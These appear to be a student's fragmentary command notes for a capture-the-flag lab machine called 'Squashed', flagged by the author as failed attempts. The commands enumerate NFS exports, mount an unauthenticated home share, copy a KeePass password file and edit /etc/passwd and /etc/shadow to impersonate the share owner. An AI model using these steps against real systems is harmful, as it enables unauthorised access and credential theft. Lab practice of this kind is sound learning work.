# Squashed CMD-by-CMDs

## FAILS - Learn Rescan this box!
## FAILS - DO not READ WRITEUP

```bash
sed -i 's///g' *-CMD-by-CMDs.md
```

```bash
showmount -e 10.129.228.109
# We do not need flags for -o because reasons?

# Does not require authenication even though it is ver4
sudo mount -t nfs -o rw,vers=4 10.129.228.109:/home/ross /mnt/ -nolock
cp /mnt/Documents/Passwords.kdbx .

# If we provided flags it will the owner will be 2017 and www-data and su to www-data wont work.
sudo mount -t nfs 10.129.228.109:/var/www/html /mnt/web -nolock

# Add a group 
groupadd $groupName

# Edit the /etc/group file, will prompt for nano, vim-* so
sudo vigr 
# Reload the /etc/group file and update /etc/gshadow
sudo grpck 
# Edit the /etc/passwd file, will prompt for nano, vim-* so
sudo vipw 
# Edit the /etc/shadow file
sudo vipw -s

sudo umount $PATHtoDirectory
```


